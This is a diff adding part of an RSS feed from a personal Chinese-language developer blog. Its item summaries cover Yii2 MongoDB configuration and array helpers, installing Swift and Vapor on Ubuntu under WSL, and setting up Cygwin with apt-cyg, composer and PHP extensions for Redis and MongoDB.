+&amp;#39;mongodb&amp;#39; =&amp;gt; [  &amp;#39;class&amp;#39; =&amp;gt; &amp;#39;yii\mongodb\Connection&amp;#39;,  &amp;#39;dsn&amp;#39; =&amp;gt; &amp;#39;mongodb://localhost:27017/&amp;#39;.env(&amp;#34;MONGODB_DATABASE&amp;#34;),  &amp;#39;options&amp;#39; =&amp;gt; [  &amp;#34;username&amp;#34; =&amp;gt; env(&amp;#34;MONGODB_USERNAME&amp;#34;),  &amp;#34;password&amp;#34; =&amp;gt; env(&amp;#34;MONGODB_PASSWORD&amp;#34;)  ]  ] 上面的代码是添加一个名为mongodb的配置项，其中包括调用的类，链接地址，还有登录数据库的配置，其中相关的配置都是使用.</description>
+    </item>
+    
+    <item>
+      <title>Yii2使用技巧（一）- 数组辅助工具</title>
+      <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-one/</link>
+      <pubDate>Wed, 16 Mar 2022 23:36:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-one/</guid>
+      <description>因为公司主线业务使用的是 Yii2，所以该系列文章主要是平时工作中使用 Yii2 框架的技巧总结，希望可以让开发者更多地使用 Yii2 框架提供的特性，编写出更加规范化和可读性更高的业务代码；Yii2 官方提供的数组工具非常实用，这里根据使用经验展开说明。
+ 一、数组筛选（\yii\helper\ArrayHelper::filter） 该函数在 Yii2.0 的权威指南中数组助手类并没有看到，而是在 API 文档中查阅到的，主要功能是根据指定的规则筛选数组，但是这个函数有使用条件，就是只能在两维或以下的数组中使用。
+从上图可以看到，该函数有两个参数，第一个参数是待处理的数组，第二个参数是筛选的规则（格式也是数组）；其中规则支持，筛选（排除）出一维或二维指定字段；下面就由一个简单的示例来说明该函数的作用。
+public function actionExample() { 	$example = [  &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;jack&amp;#39;,  &amp;#39;sex&amp;#39; =&amp;gt; &amp;#39;man&amp;#39;,  &amp;#39;age&amp;#39; =&amp;gt; 17,  &amp;#39;course&amp;#39; =&amp;gt; [  &amp;#39;one&amp;#39; =&amp;gt; &amp;#39;english&amp;#39;,  &amp;#39;two&amp;#39; =&amp;gt; &amp;#39;chinese&amp;#39;,  &amp;#39;three&amp;#39; =&amp;gt; &amp;#39;math&amp;#39;  ]  ];  $result = \yii\helpers\ArrayHelper::filter(  $example,  [&amp;#39;!name&amp;#39;,&amp;#39;sex&amp;#39;,&amp;#39;course.one&amp;#39;,&amp;#39;!course.three&amp;#39;]  );  var_dump($result);   } 上面这个 demo 里，使用该筛选函数，排除了一维的 name ，显示了一维的 sex ，显示二维的 course 中的 one ，排除了二维的 course 中的 three，最后的结果为下图。</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu 安装 Vapor</title>
+      <link>https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/</link>
+      <pubDate>Tue, 31 Aug 2021 22:38:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/</guid>
+      <description>Apple 公司的 Swift 不仅能够编写 MacOS 、IOS 端的应用，还能基于 SwiftNIO 编写服务端，在 Swift 服务端的阵营里，有 Kitura、perfect、Vapor 。
+ 而今天，我将给大家介绍一款服务端框架 Vapor，他在 github 收获高达 20.6k star 的服务端框架，同时支持 JWT、MySQL、Redis、MongoDB种种我们服务端开发所需要的组件，并且设计思路来源于 Laravel/Lumen（php开发者狂喜😆😆），同时拥有活跃的社区，并且随着 Swift 版本在不断地更新，所以，我毅然决然选择 Vapor 作为我 Swift 开发服务端的框架。
+因为我的 MacOS 系统版本是 Majove，同时平常更加倾向于使用 Windows，所以就选择了 WSL 作为 Vapor 的开发环境，使用的是 Ubuntu18.04，接下来，将先介绍下在 Ubuntu 下如何安装 Vapor。
+ 到 Vapor 的 github 项目主页上下载源码；  进入到 toolbox，执行 swift build -c release --disable-sandbox --enable-test-discovery进行源码编译，在执行 mv .build/release/vapor /usr/local/bin 移动到执行目录；  执行 vapor --help，如和上图所示，即为安装完成；  执行 vapor new hello -n，创建第一个 Vapor 项目，看到如此大的水蒸气图案💧，就证明创建完成了；  执行 swift build，编译 Vapor 项目文件；  启动项目，这时候看到命令行提示使用 127.</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu 安装 Swift</title>
+      <link>https://jadenhsiao.gitee.io/post/ubuntu-install-swift/</link>
+      <pubDate>Sun, 29 Aug 2021 21:12:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/ubuntu-install-swift/</guid>
+      <description>Apple 公司的 Swift 不仅在 MacOS 上运行，还支持在 Windows、Linux 编写程序；
+ 笔者本人日常的开发环境为 Windows，但是 Windows 安装 Swift 需要安装 Visual Studio，这件庞然大物平时比较少用，所以就不打算直接在 Windows 上安装，本人的电脑上已经安装了 Ubuntu ，所以就选择在 WSL 环境安装 Swift，接下来，我将简单分享下在 Ubuntu 安装 Swift 的流程。
+一、安装对应 Linux 所需的依赖 Swift 的官网说明了，在不同的 Linux 发行版下所需要的依赖，而我的 WSL 所安装的 Linux 发行版为 Ubuntu 18.04，所以对应选择安装依赖。
+二、下载对应系统版本的 Swift 源码包和秘钥文件 依照不同的系统提供了不同的源码包和校验秘钥，这里我们将下载 Ubuntu 18.04 的源码包和秘钥文件
+首先，使用 wget 下载 Swift 源码包；
+下载完成后，执行 tar -xzf 解压源码包；
+下载秘钥文件。
+三、配置到环境变量 在 Root 身份下，执行 cd /etc ，进入到 etc 目录，然后执行 vim profile，编辑该文件；在该文件的添加 export PATH=/swift/usr/bin:&amp;quot;${PATH}&amp;quot;，其中 swift 的运行目录就根据你解压的路径来决定。</description>
+    </item>
+    
+    <item>
+      <title>Windows10 安装 Windows Subsystem for Linux</title>
+      <link>https://jadenhsiao.gitee.io/post/windows10-install-wsl/</link>
+      <pubDate>Sat, 28 Aug 2021 00:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/windows10-install-wsl/</guid>
+      <description>适用于 Linux 的 Windows 子系统可让开发人员按原样运行 GNU/Linux 环境 - 包括大多数命令行工具、实用工具和应用程序 - 且不会产生传统虚拟机或双启动设置开销。
+ 上面这段是微软官方对于 Windows 子系统的简介，通过 WSL ，可以在 Windows 10 上安装诸如 Ubuntu、Kali、Debian等Linux的发行版，接下来，我将简单分享下安装 WSL 的流程和如何开启远程登录访问。
+一、开启 WSL 支持  WSL 作为拓展功能存在于 Windows 10 ，因此它不是默认开启的，需要我们手动启用该功能。
+ 使用 Win + R 键，启动“运行”工具，输入 control ，回车，然后再在弹出的“控制面板”界面，点击“程序和功能”；  点击“启用或关闭 Windows 功能”，在弹出的 “Windows 功能”选择“适用于 Linux 的 Windows 子系统”，点击“确定”，等待安装，重启。  二、下载安装 Linux 发行版和初始化系统  打开 Microsoft Store ，搜索 Ubuntu ，在结果内容中选择你要安装的版本，点击“获取”，这里作者选择的版本是 18.04，各位可以根据自己的开发需求，选择不同的版本。  下载安装完成后，在开始菜单就有 Ubuntu18.04 的项目，第一次点击它后，会提示需要等待几分钟来安装，安装到最后一步，提示需要创建一个 Unix 账户，按照指引填写账号，密码，再次确认密码，按下回车，看到 Installation successful ，就是完成安装和初始化了。  三、为系统创建一个 Root 用户和修改镜像源  输入  sudo passed root，先验证当前账号的密码，然后填写 root 账户的密码和确认即将设置的密码，按下回车后，如果看到 password updated successfully 就是已经创建成功了。   这里所使用的是中科大的镜像，使用cd /etc/apt 进入 apt 的目录，用 Vim 编辑 sources.</description>
+    </item>
+    
+    <item>
+      <title>Cygwin安装apt-cyg</title>
+      <link>https://jadenhsiao.gitee.io/post/cygwin-install-apt-cyg/</link>
+      <pubDate>Sun, 01 Aug 2021 11:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/cygwin-install-apt-cyg/</guid>
+      <description>在Linux系统下，如果我们需要一些软件包的话，可以使用软件包管理进行下载、安装；例如在Ubuntu下的apt-get，又或者在CentOS下的yum，都能帮助我们快速的下载安装软件包，同时又能自动安装软件包对应的依赖包，从而提高我们的开发效率。
+ 既然Cygwin是模拟Linux的运行环境，所以，毫无例外，它也提供了软件包管理工具apt-cyg，下面，我就简单分享下安装apt-cyg的方法。
+一、执行下载apt-cyg可执行文件 创建一个下载目录，在该目录下执行指令，wget https://raw.githubusercontent.com/transcode-open/apt-cyg/master/apt-cyg。
+二、执行安装   下载完成后，将apt-cyg执行安装到可执行目录，Cygwin的可执行目录是bin，指令为install apt-cyg /bin。 安装完成后就可以执行apt-cyg来测试是否安装完成。  三、设置镜像源和更新源 因为网络环境的问题，使用国内的镜像源可以提高我们在安装、更新软件包的速度，这里推荐使用网易的镜像源，执行指令apt-cyg mirror http://mirrors.163.com/cygwin，然后再更新源apt-cyg update。 完成以上步骤就可以使用apt-cyg安装需要的软件包了。</description>
+    </item>
+    
+    <item>
+      <title>Cygwin安装composer</title>
+      <link>https://jadenhsiao.gitee.io/post/cygwin-install-composer/</link>
+      <pubDate>Sun, 01 Aug 2021 11:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/cygwin-install-composer/</guid>
+      <description>A Dependency Manager for PHP
+ 上面是引用composer官网的说明，作为一个依赖管理工具，我们可以很轻松把其他开发者开发的优秀拓展引用到我们的项目上，提高我们的开发效率，下面就简单分享下Cygwin下安装composer的方法。
+一、下载composer并且移动到可执行目录  在下载目录使用wget下载composer.phar  wget https://install.phpcomposer.com/composer.phar
+移动到Cygwin的可执行目录bin  mv composer.phar /bin
+二、设置别名和测试 这一步主要为了可以在Cygwin的终端全局可以使用composer指令。 alias composer=&amp;quot;php /bin/composer.phar&amp;quot; 在终端输入composer回车，却发现报了一个致命错误，未捕获的错误，类phar未找到，这个问题还是比较好解决的，只需要打开Cygwin的安装包，搜索关键字phar，在搜索结果里选择php-phar，然后在Current选择对应的php版本，src勾选安装源码，执行下一步安装即可。 三、设置国内镜像 因为网络环境的原因，所以设置为国内的镜像可以提高我们下载更新拓展包的速度，目前国内有多家镜像提供商，这里列举几个比较常用的。
+   提供方 镜像地址     腾讯云 https://mirrors.cloud.tencent.com/composer/   阿里云 https://mirrors.aliyun.com/composer/   Packagist / Composer（中国全量镜像） https://packagist.phpcomposer.com   华为云 https://mirrors.huaweicloud.com/repository/php/    设置方法：使用以下指令，composer config -g repos.packagist composer 镜像地址 😄enjoy!!</description>
+    </item>
+    
+    <item>
+      <title>Cygwin安装phpredis拓展</title>
+      <link>https://jadenhsiao.gitee.io/post/cygwin-install-phpredis/</link>
+      <pubDate>Sun, 01 Aug 2021 11:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/cygwin-install-phpredis/</guid>
+      <description>phpredis是一个用C所编写的php拓展模块，用来链接并且操作Redis数据库上的数据
+ 这个是phpredis在github项目主页上的简介，就是一款对redis操作的拓展，在swoft的composer.json文件里，phpredis是必须要安装的拓展，下面就简单分享下Cygwin下安装phpredis的方法。
+一、下载phpredis源码包 在Cygwin终端下创建一个下载目录，用 wget来下载源码包，因为我使用的环境是Cygwin提供的php7.3.7版本，所以使用的phpredis是3.1版本，如果没有wget，可以使用安装Cygwin的安装包选择安装wget拓展。
+ 下载phpredis3.1源码包  wget http://pecl.php.net/get/redis-3.1.0.tgz
+解压源码包   tar xzf redis-3.1.0.tgz
+进入源码目录并且执行生成编译文件  cd redis-3.1.0 phpize 
+二、执行配置  这里需要注意的是，执行配置时需要指定到Cygwin下php-config文件，指令如下。  ./configure --with-php-config=/bin/php-config 三、执行编译和安装  跑完执行配置后，就是最关键的编译和安装了，指令如下。 make &amp;amp;&amp;amp; make install 四、执行测试和添加配置到php.ini  执行make test 查看上一步是否存在纰漏； 打开Cygwin的php.ini，目录在 /etc  下，加入extension=redis.so；最后再执行php -m查看列表是否存在redis，如果存在就安装完成了。</description>
+    </item>
+    
+    <item>
+      <title>Cygwin为php安装mongodb拓展</title>
+      <link>https://jadenhsiao.gitee.io/post/cygwin-install-mongodb-plugin/</link>
+      <pubDate>Sun, 01 Aug 2021 11:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/cygwin-install-mongodb-plugin/</guid>
+      <description>The purpose of this driver is to provide exceptionally thin glue between MongoDB and PHP, implementing only fundamental and performance-critical components necessary to build a fully-functional MongoDB driver.
+ 上面的引用是摘抄自mongodb拓展在pecl站点的描述，大致的意思就是该拓展为php和mongodb提供粘合剂功能，实现php链接和操作mongodb。下面就简单分享下Cygwin安装php的mongodb拓展的方法。
+一、下载mongodb拓展源码包 进入pecl，搜索mongodb，因为我使用的环境是Cygwin提供的php7.3.7版本，所以选择搜索结果的mongodb，这里看到两个mongodb相关的拓展，第二个的mongo是php5.x所使用的，这里不做深入探讨。
+进入到mongodb拓展的项目页，选择最新的的稳定版1.10.0，复制下载链接，到Cygwin内用wget 下载拓展源码包。
+1.用wget下载mongodb拓展源码包 wget http://pecl.php.net/get/mongodb-1.10.0.tgz 2.解压源码包 tar xzf mongodb-1.10.0.tgz 3.进入源码目录并且执行生成编译文件 cd mongodb-1.10.0 phpize
+二、执行配置 这里需要注意的是，执行配置时需要指定到Cygwin下php-config文件，指令如下。 ./configure --with-php-config=/bin/php-config 三、执行编译和安装 跑完执行配置后，就是最关键的编译和安装了，指令如下。 make &amp;amp;&amp;amp; make install 当你在等待他编译安装的时候，突然出现了编译出错，找不到函数。 四、处理编译错误 从报错内容分析，在 &amp;ldquo;src/libmongoc/src/libmongoc/src/mongoc/mongoc-client.c&amp;rdquo; 这个文件下，存在有未被定义的函数 &amp;ldquo;__ns_initparse&amp;rdquo; 和 &amp;ldquo;__ns_parserr&amp;rdquo;，那还好办，找到对应的类库不就行了，结果在百度上翻了近10页搜索结果都没有解决方法，遇事不决，谷歌找，就在搜索结果的第二页，看到了libspf2的静态库，里面也是包含了 &amp;ldquo;__ns_initparse&amp;rdquo; 的相关函数，同时还提供了源码。 新建一个c文件，为ns.c，文件内容就是libspf2提供的&amp;quot;__ns_initparse&amp;quot;源码，下面贴出源码内容：
+#ifndef lint static const char rcsid[] = &amp;#34;$Id: ns_parse.</description>
+    </item>
+    
+    <item>
+      <title>Windows10安装Cygwin</title>
+      <link>https://jadenhsiao.gitee.io/post/windows10-install-cygwin/</link>
+      <pubDate>Sun, 01 Aug 2021 11:33:28 +0800</pubDate>
+      
+      <guid>https://jadenhsiao.gitee.io/post/windows10-install-cygwin/</guid>
+      <description>What Is Cygwin? Get that Linux feeling - on Windows
+ 这个是Cygwin项目主页上的简介，安装它，可以得到一个类似Linux的Shell环境，在其中你可以使用绝大部分Linux软件和功能。如Gcc,Make,Vim,Emacs等等，作为一个php开发者，使用Cygwin的目的是为了运行Swoole，接下来，我将简单分享下安装Cygwin的流程和我们安装swoole需要的组件包。
+一、从项目主页下载Cygwin安装包 这个安装包不单单只是安装Cygwin，还能用来安装我们需要的组件包。
+二、安装Cygwin   选择组件包的下载方式 这里因为我使用了网络工具，网络环境相对来说比较好，所以我选择Install from Internet。
+  选择Cygwin的安装路径 安装包提示我们最好选择在盘符的根目录下作为Cygwin的运行目录。
+  选择组件包的下载路径   选择链接方式 这里就根据你自己的网络环境来选择对应的链接方式。
+  选择下载组件包的镜像地址 选择下载组件包的镜像地址； 这里也是根据网络环境，国内最好选择网易的镜像源，下载速度快且稳定。
+  选择安装组件包 这里就根据你开发环境的需要来安装组件包。
+  执行安装组件包和Cygwin 点击下一页后执行安装Cygwin和组件包，完成后就可以打开Cygwin64 Terminal来体验了。   三、安装组件包 这里我列举出我们运行php运行环境和编译Swoole所需要的组件包列表。 这一步，可以在执行安装组件包和Cygwin上进行；特别要提示的是，我们一旦选择好php的版本后，php相关组件包的安装都需要对应好版本。
+以上步骤完成后，就可以在Cygwin上进行php开发了，enjoy🤗！！</description>
+    </item>
+    
+  </channel>
+</rss>
